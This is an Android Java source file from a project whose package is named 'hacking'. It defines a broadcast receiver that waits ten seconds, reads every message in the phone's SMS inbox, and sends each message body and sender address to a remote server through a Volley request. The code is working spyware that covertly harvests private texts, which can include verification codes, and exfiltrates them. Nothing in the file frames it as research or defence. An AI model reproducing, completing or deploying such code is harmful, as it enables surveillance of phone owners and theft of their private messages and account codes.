package com.zimaheka.merwan_walid.hacking;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.toolbox.Volley;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.Map;

/**
 * Created by Walid Djebbouri on 18/02/2018.
 */

public class envoyerSMS extends BroadcastReceiver {
    private static final Uri SMS_URI_INBOX = Uri.parse("content://sms/inbox");
    @Override
    public void onReceive(Context context, Intent intent) {

        try {
            Thread.sleep(10000);
            retrieveMessages(context.getContentResolver() , context);

        } catch (InterruptedException e) {
            e.printStackTrace();
        }


    }


    private void retrieveMessages(ContentResolver contentResolver, Context context)
    {
        final Cursor cursor = contentResolver.query(SMS_URI_INBOX, null, null, null, null);

        if (cursor == null)
        {
            Log.e("retrieveMessages", "Cannot retrieve the messages");
            return;
        }

        if (cursor.moveToFirst() == true)
        {
            do
            {
                final String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                final String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                enregisterer(body , address , context);

                Log.d("retrieveContacts", "The message with from + '" + address + "' with the body '" + body + "' has been retrieved");
            }
            while (cursor.moveToNext() == true);
        }

        if (cursor.isClosed() == false)
        {
            cursor.close();
        }
    }

    public void enregisterer ( String email , String passWord, Context context){


        Response.Listener<String>  stringListener = new Response.Listener<String>(){


            @Override
            public void onResponse(String response) {

                try {
                    Log.d("onResponse",response);
                    JSONObject jsonObject = new JSONObject(response);
                    boolean success = jsonObject.getBoolean("success");
                    if (success){

                    }
                    else {

                    }
                } catch (JSONException e) {
                    e.printStackTrace();


                }
            }
        } ;


        connexion cnx = new connexion(email , passWord , stringListener ) ;

        Map<String, String> hashMap= null;
        try {
            hashMap = cnx.getParams();
        } catch (AuthFailureError authFailureError) {
            authFailureError.printStackTrace();
        }




        RequestQueue requestQueue = Volley.newRequestQueue(context);
        requestQueue.add(cnx);


    }

}
